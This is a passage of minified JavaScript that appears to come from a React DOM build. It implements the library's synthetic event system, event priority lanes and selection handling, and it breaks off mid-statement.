n.is=="string";switch(e){case"annotation-xml":case"color-profile":case"font-face":case"font-face-src":case"font-face-uri":case"font-face-format":case"font-face-name":case"missing-glyph":return!1;default:return!0}}var sl=null;function Yl(e){return e=e.target||e.srcElement||window,e.correspondingUseElement&&(e=e.correspondingUseElement),e.nodeType===3?e.parentNode:e}var al=null,Gn=null,Xn=null;function Ki(e){if(e=Zt(e)){if(typeof al!="function")throw Error(v(280));var n=e.stateNode;n&&(n=so(n),al(e.stateNode,e.type,n))}}function va(e){Gn?Xn?Xn.push(e):Xn=[e]:Gn=e}function ya(){if(Gn){var e=Gn,n=Xn;if(Xn=Gn=null,Ki(e),n)for(e=0;e<n.length;e++)Ki(n[e])}}function Sa(e,n){return e(n)}function wa(){}var Eo=!1;function ka(e,n,t){if(Eo)return e(n,t);Eo=!0;try{return Sa(e,n,t)}finally{Eo=!1,(Gn!==null||Xn!==null)&&(wa(),ya())}}function _t(e,n){var t=e.stateNode;if(t===null)return null;var r=so(t);if(r===null)return null;t=r[n];e:switch(n){case"onClick":case"onClickCapture":case"onDoubleClick":case"onDoubleClickCapture":case"onMouseDown":case"onMouseDownCapture":case"onMouseMove":case"onMouseMoveCapture":case"onMouseUp":case"onMouseUpCapture":case"onMouseEnter":(r=!r.disabled)||(e=e.type,r=!(e==="button"||e==="input"||e==="select"||e==="textarea")),e=!r;break e;default:e=!1}if(e)return null;if(t&&typeof t!="function")throw Error(v(231,n,typeof t));return t}var ul=!1;if($e)try{var ft={};Object.defineProperty(ft,"passive",{get:function(){ul=!0}}),window.addEventListener("test",ft,ft),window.removeEventListener("test",ft,ft)}catch{ul=!1}function Uc(e,n,t,r,o,l,i,s,a){var c=Array.prototype.slice.call(arguments,3);try{n.apply(t,c)}catch(p){this.onError(p)}}var xt=!1,Dr=null,Lr=!1,cl=null,Vc={onError:function(e){xt=!0,Dr=e}};function Bc(e,n,t,r,o,l,i,s,a){xt=!1,Dr=null,Uc.apply(Vc,arguments)}function Wc(e,n,t,r,o,l,i,s,a){if(Bc.apply(this,arguments),xt){if(xt){var c=Dr;xt=!1,Dr=null}else throw Error(v(198));Lr||(Lr=!0,cl=c)}}function Dn(e){var n=e,t=e;if(e.alternate)for(;n.return;)n=n.return;else{e=n;do n=e,n.flags&4098&&(t=n.return),e=n.return;while(e)}return n.tag===3?t:null}function Ca(e){if(e.tag===13){var n=e.memoizedState;if(n===null&&(e=e.alternate,e!==null&&(n=e.memoizedState)),n!==null)return n.dehydrated}return null}function Qi(e){if(Dn(e)!==e)throw Error(v(188))}function Jc(e){var n=e.alternate;if(!n){if(n=Dn(e),n===null)throw Error(v(188));return n!==e?null:e}for(var t=e,r=n;;){var o=t.return;if(o===null)break;var l=o.alternate;if(l===null){if(r=o.return,r!==null){t=r;continue}break}if(o.child===l.child){for(l=o.child;l;){if(l===t)return Qi(o),e;if(l===r)return Qi(o),n;l=l.sibling}throw Error(v(188))}if(t.return!==r.return)t=o,r=l;else{for(var i=!1,s=o.child;s;){if(s===t){i=!0,t=o,r=l;break}if(s===r){i=!0,r=o,t=l;break}s=s.sibling}if(!i){for(s=l.child;s;){if(s===t){i=!0,t=l,r=o;break}if(s===r){i=!0,r=l,t=o;break}s=s.sibling}if(!i)throw Error(v(189))}}if(t.alternate!==r)throw Error(v(190))}if(t.tag!==3)throw Error(v(188));return t.stateNode.current===t?e:n}function Ta(e){return e=Jc(e),e!==null?xa(e):null}function xa(e){if(e.tag===5||e.tag===6)return e;for(e=e.child;e!==null;){var n=xa(e);if(n!==null)return n;e=e.sibling}return null}var Pa=ve.unstable_scheduleCallback,Gi=ve.unstable_cancelCallback,$c=ve.unstable_shouldYield,Kc=ve.unstable_requestPaint,$=ve.unstable_now,Qc=ve.unstable_getCurrentPriorityLevel,Zl=ve.unstable_ImmediatePriority,Ea=ve.unstable_UserBlockingPriority,_r=ve.unstable_NormalPriority,Gc=ve.unstable_LowPriority,ja=ve.unstable_IdlePriority,ro=null,Fe=null;function Xc(e){if(Fe&&typeof Fe.onCommitFiberRoot=="function")try{Fe.onCommitFiberRoot(ro,e,void 0,(e.current.flags&128)===128)}catch{}}var De=Math.clz32?Math.clz32:Zc,bc=Math.log,Yc=Math.LN2;function Zc(e){return e>>>=0,e===0?32:31-(bc(e)/Yc|0)|0}var ir=64,sr=4194304;function kt(e){switch(e&-e){case 1:return 1;case 2:return 2;case 4:return 4;case 8:return 8;case 16:return 16;case 32:return 32;case 64:case 128:case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:case 262144:case 524288:case 1048576:case 2097152:return e&4194240;case 4194304:case 8388608:case 16777216:case 33554432:case 67108864:return e&130023424;case 134217728:return 134217728;case 268435456:return 268435456;case 536870912:return 536870912;case 1073741824:return 1073741824;default:return e}}function Ir(e,n){var t=e.pendingLanes;if(t===0)return 0;var r=0,o=e.suspendedLanes,l=e.pingedLanes,i=t&268435455;if(i!==0){var s=i&~o;s!==0?r=kt(s):(l&=i,l!==0&&(r=kt(l)))}else i=t&~o,i!==0?r=kt(i):l!==0&&(r=kt(l));if(r===0)return 0;if(n!==0&&n!==r&&!(n&o)&&(o=r&-r,l=n&-n,o>=l||o===16&&(l&4194240)!==0))return n;if(r&4&&(r|=t&16),n=e.entangledLanes,n!==0)for(e=e.entanglements,n&=r;0<n;)t=31-De(n),o=1<<t,r|=e[t],n&=~o;return r}function qc(e,n){switch(e){case 1:case 2:case 4:return n+250;case 8:case 16:case 32:case 64:case 128:case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:case 262144:case 524288:case 1048576:case 2097152:return n+5e3;case 4194304:case 8388608:case 16777216:case 33554432:case 67108864:return-1;case 134217728:case 268435456:case 536870912:case 1073741824:return-1;default:return-1}}function ed(e,n){for(var t=e.suspendedLanes,r=e.pingedLanes,o=e.expirationTimes,l=e.pendingLanes;0<l;){var i=31-De(l),s=1<<i,a=o[i];a===-1?(!(s&t)||s&r)&&(o[i]=qc(s,n)):a<=n&&(e.expiredLanes|=s),l&=~s}}function dl(e){return e=e.pendingLanes&-1073741825,e!==0?e:e&1073741824?1073741824:0}function Ra(){var e=ir;return ir<<=1,!(ir&4194240)&&(ir=64),e}function jo(e){for(var n=[],t=0;31>t;t++)n.push(e);return n}function bt(e,n,t){e.pendingLanes|=n,n!==536870912&&(e.suspendedLanes=0,e.pingedLanes=0),e=e.eventTimes,n=31-De(n),e[n]=t}function nd(e,n){var t=e.pendingLanes&~n;e.pendingLanes=n,e.suspendedLanes=0,e.pingedLanes=0,e.expiredLanes&=n,e.mutableReadLanes&=n,e.entangledLanes&=n,n=e.entanglements;var r=e.eventTimes;for(e=e.expirationTimes;0<t;){var o=31-De(t),l=1<<o;n[o]=0,r[o]=-1,e[o]=-1,t&=~l}}function ql(e,n){var t=e.entangledLanes|=n;for(e=e.entanglements;t;){var r=31-De(t),o=1<<r;o&n|e[r]&n&&(e[r]|=n),t&=~o}}var L=0;function Na(e){return e&=-e,1<e?4<e?e&268435455?16:536870912:4:1}var Ma,ei,Oa,Da,La,fl=!1,ar=[],rn=null,on=null,ln=null,It=new Map,At=new Map,qe=[],td="mousedown mouseup touchcancel touchend touchstart auxclick dblclick pointercancel pointerdown pointerup dragend dragstart drop compositionend compositionstart keydown keypress keyup input textInput copy cut paste click change contextmenu reset submit".split(" ");function Xi(e,n){switch(e){case"focusin":case"focusout":rn=null;break;case"dragenter":case"dragleave":on=null;break;case"mouseover":case"mouseout":ln=null;break;case"pointerover":case"pointerout":It.delete(n.pointerId);break;case"gotpointercapture":case"lostpointercapture":At.delete(n.pointerId)}}function pt(e,n,t,r,o,l){return e===null||e.nativeEvent!==l?(e={blockedOn:n,domEventName:t,eventSystemFlags:r,nativeEvent:l,targetContainers:[o]},n!==null&&(n=Zt(n),n!==null&&ei(n)),e):(e.eventSystemFlags|=r,n=e.targetContainers,o!==null&&n.indexOf(o)===-1&&n.push(o),e)}function rd(e,n,t,r,o){switch(n){case"focusin":return rn=pt(rn,e,n,t,r,o),!0;case"dragenter":return on=pt(on,e,n,t,r,o),!0;case"mouseover":return ln=pt(ln,e,n,t,r,o),!0;case"pointerover":var l=o.pointerId;return It.set(l,pt(It.get(l)||null,e,n,t,r,o)),!0;case"gotpointercapture":return l=o.pointerId,At.set(l,pt(At.get(l)||null,e,n,t,r,o)),!0}return!1}function _a(e){var n=kn(e.target);if(n!==null){var t=Dn(n);if(t!==null){if(n=t.tag,n===13){if(n=Ca(t),n!==null){e.blockedOn=n,La(e.priority,function(){Oa(t)});return}}else if(n===3&&t.stateNode.current.memoizedState.isDehydrated){e.blockedOn=t.tag===3?t.stateNode.containerInfo:null;return}}}e.blockedOn=null}function kr(e){if(e.blockedOn!==null)return!1;for(var n=e.targetContainers;0<n.length;){var t=pl(e.domEventName,e.eventSystemFlags,n[0],e.nativeEvent);if(t===null){t=e.nativeEvent;var r=new t.constructor(t.type,t);sl=r,t.target.dispatchEvent(r),sl=null}else return n=Zt(t),n!==null&&ei(n),e.blockedOn=t,!1;n.shift()}return!0}function bi(e,n,t){kr(e)&&t.delete(n)}function od(){fl=!1,rn!==null&&kr(rn)&&(rn=null),on!==null&&kr(on)&&(on=null),ln!==null&&kr(ln)&&(ln=null),It.forEach(bi),At.forEach(bi)}function mt(e,n){e.blockedOn===n&&(e.blockedOn=null,fl||(fl=!0,ve.unstable_scheduleCallback(ve.unstable_NormalPriority,od)))}function zt(e){function n(o){return mt(o,e)}if(0<ar.length){mt(ar[0],e);for(var t=1;t<ar.length;t++){var r=ar[t];r.blockedOn===e&&(r.blockedOn=null)}}for(rn!==null&&mt(rn,e),on!==null&&mt(on,e),ln!==null&&mt(ln,e),It.forEach(n),At.forEach(n),t=0;t<qe.length;t++)r=qe[t],r.blockedOn===e&&(r.blockedOn=null);for(;0<qe.length&&(t=qe[0],t.blockedOn===null);)_a(t),t.blockedOn===null&&qe.shift()}var bn=Xe.ReactCurrentBatchConfig,Ar=!0;function ld(e,n,t,r){var o=L,l=bn.transition;bn.transition=null;try{L=1,ni(e,n,t,r)}finally{L=o,bn.transition=l}}function id(e,n,t,r){var o=L,l=bn.transition;bn.transition=null;try{L=4,ni(e,n,t,r)}finally{L=o,bn.transition=l}}function ni(e,n,t,r){if(Ar){var o=pl(e,n,t,r);if(o===null)zo(e,n,r,zr,t),Xi(e,r);else if(rd(o,e,n,t,r))r.stopPropagation();else if(Xi(e,r),n&4&&-1<td.indexOf(e)){for(;o!==null;){var l=Zt(o);if(l!==null&&Ma(l),l=pl(e,n,t,r),l===null&&zo(e,n,r,zr,t),l===o)break;o=l}o!==null&&r.stopPropagation()}else zo(e,n,r,null,t)}}var zr=null;function pl(e,n,t,r){if(zr=null,e=Yl(r),e=kn(e),e!==null)if(n=Dn(e),n===null)e=null;else if(t=n.tag,t===13){if(e=Ca(n),e!==null)return e;e=null}else if(t===3){if(n.stateNode.current.memoizedState.isDehydrated)return n.tag===3?n.stateNode.containerInfo:null;e=null}else n!==e&&(e=null);return zr=e,null}function Ia(e){switch(e){case"cancel":case"click":case"close":case"contextmenu":case"copy":case"cut":case"auxclick":case"dblclick":case"dragend":case"dragstart":case"drop":case"focusin":case"focusout":case"input":case"invalid":case"keydown":case"keypress":case"keyup":case"mousedown":case"mouseup":case"paste":case"pause":case"play":case"pointercancel":case"pointerdown":case"pointerup":case"ratechange":case"reset":case"resize":case"seeked":case"submit":case"touchcancel":case"touchend":case"touchstart":case"volumechange":case"change":case"selectionchange":case"textInput":case"compositionstart":case"compositionend":case"compositionupdate":case"beforeblur":case"afterblur":case"beforeinput":case"blur":case"fullscreenchange":case"focus":case"hashchange":case"popstate":case"select":case"selectstart":return 1;case"drag":case"dragenter":case"dragexit":case"dragleave":case"dragover":case"mousemove":case"mouseout":case"mouseover":case"pointermove":case"pointerout":case"pointerover":case"scroll":case"toggle":case"touchmove":case"wheel":case"mouseenter":case"mouseleave":case"pointerenter":case"pointerleave":return 4;case"message":switch(Qc()){case Zl:return 1;case Ea:return 4;case _r:case Gc:return 16;case ja:return 536870912;default:return 16}default:return 16}}var nn=null,ti=null,Cr=null;function Aa(){if(Cr)return Cr;var e,n=ti,t=n.length,r,o="value"in nn?nn.value:nn.textContent,l=o.length;for(e=0;e<t&&n[e]===o[e];e++);var i=t-e;for(r=1;r<=i&&n[t-r]===o[l-r];r++);return Cr=o.slice(e,1<r?1-r:void 0)}function Tr(e){var n=e.keyCode;return"charCode"in e?(e=e.charCode,e===0&&n===13&&(e=13)):e=n,e===10&&(e=13),32<=e||e===13?e:0}function ur(){return!0}function Yi(){return!1}function Se(e){function n(t,r,o,l,i){this._reactName=t,this._targetInst=o,this.type=r,this.nativeEvent=l,this.target=i,this.currentTarget=null;for(var s in e)e.hasOwnProperty(s)&&(t=e[s],this[s]=t?t(l):l[s]);return this.isDefaultPrevented=(l.defaultPrevented!=null?l.defaultPrevented:l.returnValue===!1)?ur:Yi,this.isPropagationStopped=Yi,this}return V(n.prototype,{preventDefault:function(){this.defaultPrevented=!0;var t=this.nativeEvent;t&&(t.preventDefault?t.preventDefault():typeof t.returnValue!="unknown"&&(t.returnValue=!1),this.isDefaultPrevented=ur)},stopPropagation:function(){var t=this.nativeEvent;t&&(t.stopPropagation?t.stopPropagation():typeof t.cancelBubble!="unknown"&&(t.cancelBubble=!0),this.isPropagationStopped=ur)},persist:function(){},isPersistent:ur}),n}var st={eventPhase:0,bubbles:0,cancelable:0,timeStamp:function(e){return e.timeStamp||Date.now()},defaultPrevented:0,isTrusted:0},ri=Se(st),Yt=V({},st,{view:0,detail:0}),sd=Se(Yt),Ro,No,ht,oo=V({},Yt,{screenX:0,screenY:0,clientX:0,clientY:0,pageX:0,pageY:0,ctrlKey:0,shiftKey:0,altKey:0,metaKey:0,getModifierState:oi,button:0,buttons:0,relatedTarget:function(e){return e.relatedTarget===void 0?e.fromElement===e.srcElement?e.toElement:e.fromElement:e.relatedTarget},movementX:function(e){return"movementX"in e?e.movementX:(e!==ht&&(ht&&e.type==="mousemove"?(Ro=e.screenX-ht.screenX,No=e.screenY-ht.screenY):No=Ro=0,ht=e),Ro)},movementY:function(e){return"movementY"in e?e.movementY:No}}),Zi=Se(oo),ad=V({},oo,{dataTransfer:0}),ud=Se(ad),cd=V({},Yt,{relatedTarget:0}),Mo=Se(cd),dd=V({},st,{animationName:0,elapsedTime:0,pseudoElement:0}),fd=Se(dd),pd=V({},st,{clipboardData:function(e){return"clipboardData"in e?e.clipboardData:window.clipboardData}}),md=Se(pd),hd=V({},st,{data:0}),qi=Se(hd),gd={Esc:"Escape",Spacebar:" ",Left:"ArrowLeft",Up:"ArrowUp",Right:"ArrowRight",Down:"ArrowDown",Del:"Delete",Win:"OS",Menu:"ContextMenu",Apps:"ContextMenu",Scroll:"ScrollLock",MozPrintableKey:"Unidentified"},vd={8:"Backspace",9:"Tab",12:"Clear",13:"Enter",16:"Shift",17:"Control",18:"Alt",19:"Pause",20:"CapsLock",27:"Escape",32:" ",33:"PageUp",34:"PageDown",35:"End",36:"Home",37:"ArrowLeft",38:"ArrowUp",39:"ArrowRight",40:"ArrowDown",45:"Insert",46:"Delete",112:"F1",113:"F2",114:"F3",115:"F4",116:"F5",117:"F6",118:"F7",119:"F8",120:"F9",121:"F10",122:"F11",123:"F12",144:"NumLock",145:"ScrollLock",224:"Meta"},yd={Alt:"altKey",Control:"ctrlKey",Meta:"metaKey",Shift:"shiftKey"};function Sd(e){var n=this.nativeEvent;return n.getModifierState?n.getModifierState(e):(e=yd[e])?!!n[e]:!1}function oi(){return Sd}var wd=V({},Yt,{key:function(e){if(e.key){var n=gd[e.key]||e.key;if(n!=="Unidentified")return n}return e.type==="keypress"?(e=Tr(e),e===13?"Enter":String.fromCharCode(e)):e.type==="keydown"||e.type==="keyup"?vd[e.keyCode]||"Unidentified":""},code:0,location:0,ctrlKey:0,shiftKey:0,altKey:0,metaKey:0,repeat:0,locale:0,getModifierState:oi,charCode:function(e){return e.type==="keypress"?Tr(e):0},keyCode:function(e){return e.type==="keydown"||e.type==="keyup"?e.keyCode:0},which:function(e){return e.type==="keypress"?Tr(e):e.type==="keydown"||e.type==="keyup"?e.keyCode:0}}),kd=Se(wd),Cd=V({},oo,{pointerId:0,width:0,height:0,pressure:0,tangentialPressure:0,tiltX:0,tiltY:0,twist:0,pointerType:0,isPrimary:0}),es=Se(Cd),Td=V({},Yt,{touches:0,targetTouches:0,changedTouches:0,altKey:0,metaKey:0,ctrlKey:0,shiftKey:0,getModifierState:oi}),xd=Se(Td),Pd=V({},st,{propertyName:0,elapsedTime:0,pseudoElement:0}),Ed=Se(Pd),jd=V({},oo,{deltaX:function(e){return"deltaX"in e?e.deltaX:"wheelDeltaX"in e?-e.wheelDeltaX:0},deltaY:function(e){return"deltaY"in e?e.deltaY:"wheelDeltaY"in e?-e.wheelDeltaY:"wheelDelta"in e?-e.wheelDelta:0},deltaZ:0,deltaMode:0}),Rd=Se(jd),Nd=[9,13,27,32],li=$e&&"CompositionEvent"in window,Pt=null;$e&&"documentMode"in document&&(Pt=document.documentMode);var Md=$e&&"TextEvent"in window&&!Pt,za=$e&&(!li||Pt&&8<Pt&&11>=Pt),ns=" ",ts=!1;function Fa(e,n){switch(e){case"keyup":return Nd.indexOf(n.keyCode)!==-1;case"keydown":return n.keyCode!==229;case"keypress":case"mousedown":case"focusout":return!0;default:return!1}}function Ha(e){return e=e.detail,typeof e=="object"&&"data"in e?e.data:null}var zn=!1;function Od(e,n){switch(e){case"compositionend":return Ha(n);case"keypress":return n.which!==32?null:(ts=!0,ns);case"textInput":return e=n.data,e===ns&&ts?null:e;default:return null}}function Dd(e,n){if(zn)return e==="compositionend"||!li&&Fa(e,n)?(e=Aa(),Cr=ti=nn=null,zn=!1,e):null;switch(e){case"paste":return null;case"keypress":if(!(n.ctrlKey||n.altKey||n.metaKey)||n.ctrlKey&&n.altKey){if(n.char&&1<n.char.length)return n.char;if(n.which)return String.fromCharCode(n.which)}return null;case"compositionend":return za&&n.locale!=="ko"?null:n.data;default:return null}}var Ld={color:!0,date:!0,datetime:!0,"datetime-local":!0,email:!0,month:!0,number:!0,password:!0,range:!0,search:!0,tel:!0,text:!0,time:!0,url:!0,week:!0};function rs(e){var n=e&&e.nodeName&&e.nodeName.toLowerCase();return n==="input"?!!Ld[e.type]:n==="textarea"}function Ua(e,n,t,r){va(r),n=Fr(n,"onChange"),0<n.length&&(t=new ri("onChange","change",null,t,r),e.push({event:t,listeners:n}))}var Et=null,Ft=null;function _d(e){Ya(e,0)}function lo(e){var n=Un(e);if(ca(n))return e}function Id(e,n){if(e==="change")return n}var Va=!1;if($e){var Oo;if($e){var Do="oninput"in document;if(!Do){var os=document.createElement("div");os.setAttribute("oninput","return;"),Do=typeof os.oninput=="function"}Oo=Do}else Oo=!1;Va=Oo&&(!document.documentMode||9<document.documentMode)}function ls(){Et&&(Et.detachEvent("onpropertychange",Ba),Ft=Et=null)}function Ba(e){if(e.propertyName==="value"&&lo(Ft)){var n=[];Ua(n,Ft,e,Yl(e)),ka(_d,n)}}function Ad(e,n,t){e==="focusin"?(ls(),Et=n,Ft=t,Et.attachEvent("onpropertychange",Ba)):e==="focusout"&&ls()}function zd(e){if(e==="selectionchange"||e==="keyup"||e==="keydown")return lo(Ft)}function Fd(e,n){if(e==="click")return lo(n)}function Hd(e,n){if(e==="input"||e==="change")return lo(n)}function Ud(e,n){return e===n&&(e!==0||1/e===1/n)||e!==e&&n!==n}var _e=typeof Object.is=="function"?Object.is:Ud;function Ht(e,n){if(_e(e,n))return!0;if(typeof e!="object"||e===null||typeof n!="object"||n===null)return!1;var t=Object.keys(e),r=Object.keys(n);if(t.length!==r.length)return!1;for(r=0;r<t.length;r++){var o=t[r];if(!Xo.call(n,o)||!_e(e[o],n[o]))return!1}return!0}function is(e){for(;e&&e.firstChild;)e=e.firstChild;return e}function ss(e,n){var t=is(e);e=0;for(var r;t;){if(t.nodeType===3){if(r=e+t.textContent.length,e<=n&&r>=n)return{node:t,offset:n-e};e=r}e:{for(;t;){if(t.nextSibling){t=t.nextSibling;break e}t=t.parentNode}t=void 0}t=is(t)}}function Wa(e,n){return e&&n?e===n?!0:e&&e.nodeType===3?!1:n&&n.nodeType===3?Wa(e,n.parentNode):"contains"in e?e.contains(n):e.compareDocumentPosition?!!(e.compareDocumentPosition(n)&16):!1:!1}function Ja(){for(var e=window,n=Or();n instanceof e.HTMLIFrameElement;){try{var t=typeof n.contentWindow.location.href=="string"}catch{t=!1}if(t)e=n.contentWindow;else break;n=Or(e.document)}return n}function ii(e){var n=e&&e.nodeName&&e.nodeName.toLowerCase();return n&&(n==="input"&&(e.type==="text"||e.type==="search"||e.type==="tel"||e.type==="url"||e.type==="password")||n==="textarea"||e.contentEditable==="true")}function Vd(e){var n=Ja(),t=e.focusedElem,r=e.selectionRange;if(n!==t&&t&&t.ownerDocument&&Wa(t.ownerDocument.documentElement,t)){if(r!==null&&ii(t)){if(n=r.start,e=r.end,e===void 0&&(e=n),"selectionStart"in t)t.selectionStart=n,t.selectionEnd=Math.min(e,t.value.length);else if(e=(n=t.ownerDocument||document)&&n.defaultView||window,e.getSelection){e=e.getSelection();var o=t.textContent.length,l=Math.min(r.start,o);r=r.end===void 0?l:Math.min(r.end,o),!e.extend&&l>r&&(o=r,r=l,l=o),o=ss(t,l);var i=ss(t,r);o&&i&&(e.rangeCount!==1||e.anchorNode!==o.node||e.anchorOffset!==o.offset||e.focusNode!==i.node||e.focusOffset!==i.offset)&&(n=n.createRange(),n.setStart(o.node,o.offset),e.removeAllRanges(),l>r?(e.addRange(n),e.extend(i.node,i.offset)):(n.setEnd(i.node,i.offset),e.addRange(n)))}}for(n=[],e=t;e=e.parentNode;)e.nodeType===1&&n.push({element:e,left:e.scrollLeft,top:e.scrollTop});for(typeof t.focus=="function"&&t.focus(),t=0;t<n.length;t++)e=n[t],e.element.scrollLeft=e.left,e.element.scrollTop=e.top}}var Bd=$e&&"documentMode"in document&&11>=document.documentMode,Fn=null,ml=null,jt=null,hl=!1;function as(e,n,t){var r=t.window===t?t.document:t.nodeType===9?t:t.ownerDocument;hl||Fn==null||Fn!==Or(r)||(r=Fn,"selectionStart"in r&&ii(r)?r={start:r.selectionStart,end:r.selectionEnd}:(r=(r.ownerDocument&&r.ownerDocument.defaultView||window).getSelection(),r={anchorNode:r.anchorNode,anchorOffset:r.anchorOffset,focusNode:r.focusNode,focusOffset:r.focusOffset}),jt&&Ht(jt,r)||(jt=r,r=Fr(ml,"onSelect"),0<r.length&&(n=new ri("onSelect","select",null,n,t),e.push({event:n,listeners:r}),n.target=Fn)))}function cr(e,n){var t={};return t[e.toLowerCase()]=n.toLowerCase(),t["Webkit"+e]="webkit"+n,t["Moz"+e]="moz"+n,t}var Hn={animationend:cr("Animation","AnimationEnd"),animationiteration:cr("Animation","AnimationIteration"),animationstart:cr("Animation","AnimationStart"),transitionend:cr("Transition","TransitionEnd")},Lo={},$a={};$e&&($a=document.createElement("div").style,"AnimationEvent"in window||(delete Hn.animationend.animation,delete Hn.animationiteration.animation,delete Hn.animationstart.animation),"TransitionEvent"in window||delete Hn.transitionend.transition);function io(e){if(Lo[e])return Lo[e];if(!Hn[e])return e;var n=Hn[e],t;for(t in n)if(n.hasOwnProperty(t)&&t in $a)return Lo[e]=n[t];return e}var Ka=io("animationend"),Qa=io("animationiteration"),Ga=io("animationstart"),Xa=io("transitionend"),ba=new Map,us="abort auxClick cancel canPlay canPlayThrough click close contextMenu copy cut drag dragEnd dragEnter dragExit dragLeave dragOver dragStart drop durationChange emptied encrypted ended error gotPointerCapture input invalid keyDown keyPress keyUp load loadedData loadedMetadata loadStart lostPointerCapture mouseDown mouseMove mouseOut mouseOver mouseUp paste pause play playing pointerCancel pointerDown pointerMove pointerOut pointerOver pointerUp progress rateChange reset resize seeked seeking stalled submit suspend timeUpdate touchCancel touchEnd touchStart volumeChange scroll toggle touchMove waiting wheel".split(" ");function mn(e,n){ba.set(e,n),On(n,[e])}for(var _o=0;_o<us.length;_o++){var Io=us[_o],Wd=Io.toLowerCase(),Jd=Io[0].toUpperCase()+Io.slice(1);mn(Wd,"on"+Jd)}mn(Ka,"onAnimationEnd");mn(Qa,"onAnimationIteration");mn(Ga,"onAnimationStart");mn("dblclick","onDoubleClick");mn("focusin","onFocus");mn("focusout","onBlur");mn(Xa,"onTransitionEnd");qn("onMouseEnter",["mouseout","mouseover"]);qn("onMouseLeave",["mouseout","mouseover"]);qn("onPointerEnter",["pointerout","pointerover"]);qn("onPointerLeave",["pointerout","pointerover"]);On("onChange","change click focusin focusout input keydown keyup selectionchange".split(" "));On("onSelect","focusout contextmenu dragend focusin keydown keyup mousedown mouseup selectionchange".split(" "));On("onBeforeInput",["compositionend","keypress","textInput","paste"]);On("onCompositionEnd","compositionend focusout keydown keypress keyup mousedown".split(" "));On("onCompositionStart","compositionstart focusout keydown keypress keyup mousedown".split(" "));On("onCompositionUpdate","compositionupdate focusout keydown keypress keyup mousedown".split(" "));var Ct="abort canplay canplaythrough durationchange emptied encrypted ended error loadeddata loadedmetadata loadstart pause play playing progress ratechange resize seeked seeking stalled suspend timeupdate volumechange waiting".split(" "),$d=new Set("cancel close invalid load scroll toggle".split(" ").concat(Ct));function cs(e,n,t){var r=e.type||"unknown-event";e.currentTarget=t,Wc(r,n,void 0,e),e.currentTarget=null}function Ya(e,n){n=(n&4)!==0;for(var t=0;t<e.length;t++){var r=e[t],o=r.event;r=r.listeners;e:{var l=void 0;if(n)for(var i=r.length-1;0<=i;i--){var s=r[i],a=s.instance,c=s.currentTarget;if(s=s.listener,a!==l&&o.isPropagationStopped())break e;cs(o,s,c),l=a}else for(i=0;i<r.length;i++){if(s=r[i],a=s.instance,c=s.currentTarget,s=s.listener,a!==l&&o.isPropagationStopped())break e;cs(o,s,c),l=a}}}if(Lr)throw e=cl,Lr=!1,cl=null,e}function I(e,n){var t=n[wl];t===void 0&&(t=n[wl]=new Set);var r=e+"__bubble";t.has(r)||(Za(n,e,2,!1),t.add(r))}function Ao(e,n,t){var r=0;n&&(r|=4),Za(t,e,r,n)}var dr="_reactListening"+Math.random().toString(36).slice(2);function Ut(e){if(!e[dr]){e[dr]=!0,la.forEach(function(t){t!=="selectionchange"&&($d.has(t)||Ao(t,!1,e),Ao(t,!0,e))});var n=e.nodeType===9?e:e.ownerDocument;n===null||n[dr]||(n[dr]=!0,Ao("selectionchange",!1,n))}}function Za(e,n,t,r){switch(Ia(n)){case 1:var o=ld;break;case 4:o=id;break;default:o=ni}t=o.bind(null,n,t,e),o=void 0,!ul||n!=="touchstart"&&n!=="touchmove"&&n!=="wheel"||(o=!0),r?o!==void 0?e.addEventListener(n,t,{capture:!0,passive:o}):e.addEventListener(n,t,!0):o!==void 0?e.addEventListener(n,t,{passive:o}):e.addEventListener(n,t,!1)}function zo(e,n,t,r,o){var l=r;if(!(n&1)&&!(n&2)&&r!==null)e:for(;;){if(r===null)return;var i=r.tag;if(i===3||i===4){var s=r.stateNode.containerInfo;if(s===o||s.nodeType===8&&s.parentNode===o)break;if(i===4)for(i=r.return;i!==null;){var a=i.tag;if((a===3||a===4)&&(a=i.stateNode.containerInfo,a===o||a.nodeType===8&&a.parentNode===o))return;i=i.return}for(;s!==null;){if(i=kn(s),i===null)return;if(a=i.tag,a===5||a===6){r=l=i;continue e}s=s.parentNode}}r=r.return}ka(function(){var c=l,p=Yl(t),h=[];e:{var m=ba.get(e);if(m!==void 0){var S=ri,w=e;switch(e){case"keypress":if(Tr(t)===0)break e;case"keydown":case"keyup":S=kd;break;case"focusin":w="focus",S=Mo;break;case"focusout":w="blur",S=Mo;break;case"beforeblur":case"afterblur":S=Mo;break;case"click":if(t.button===2)break e;case"auxclick":case"dblclick":case"mousedown":case"mousemove":case"mouseup":case"mouseout":case"mouseover":case"contextmenu":S=Zi;break;case"drag":case"dragend":case"dragenter":case"dragexit":case"dragleave":case"dragover":case"dragstart":case"drop":S=ud;break;case"touchcancel":case"touchend":case"touchmove":case"touchstart":S=xd;break;case Ka:case Qa:case Ga:S=fd;break;case Xa:S=Ed;break;case"scroll":S=sd;break;case"wheel":S=Rd;break;case"copy":case"cut":case"paste":S=md;break;case"gotpointercapture":case"lostpointercapture":case"pointercancel":case"pointerdown":case"pointermove":case"pointerout":case"pointerover":case"pointerup":S=es}var k=(n&4)!==0,z=!k&&e==="scroll",d=k?m!==null?m+"Capture":null:m;k=[];for(var u=c,f;u!==null;){f=u;var g=f.stateNode;if(f.tag===5&&g!==null&&(f=g,d!==null&&(g=_t(u,d),g!=null&&k.push(Vt(u,g,f)))),z)break;u=u.return}0<k.length&&(m=new S(m,w,null,t,p),h.push({event:m,listeners:k}))}}if(!(n&7)){e:{if(m=e==="mouseover"||e==="pointerover",S=e==="mouseout"||e==="pointerout",m&&t!==sl&&(w=t.relatedTarget||t.fromElement)&&(kn(w)||w[Ke]))break e;if((S||m)&&(m=p.window===p?p:(m=p.ownerDocument)?m.defaultView||m.parentWindow:window,S?(w=t.relatedTarget||t.toElement,S=c,w=w?kn(w):null,w!==null&&(z=Dn(w),w!==z||w.tag!==5&&w.tag!==6)&&(w=null)):(S=null,w=c),S!==w)){if(k=Zi,g="onMouseLeave",d="onMouseEnter",u="mouse",(e==="pointerout"||e==="pointerover")&&(k=es,g="onPointerLeave",d="onPointerEnter",u="pointer"),z=S==null?m:Un(S),f=w==null?m:Un(w),m=new k(g,u+"leave",S,t,p),m.target=z,m.relatedTarget=f,g=null,kn(p)===c&&(k=new 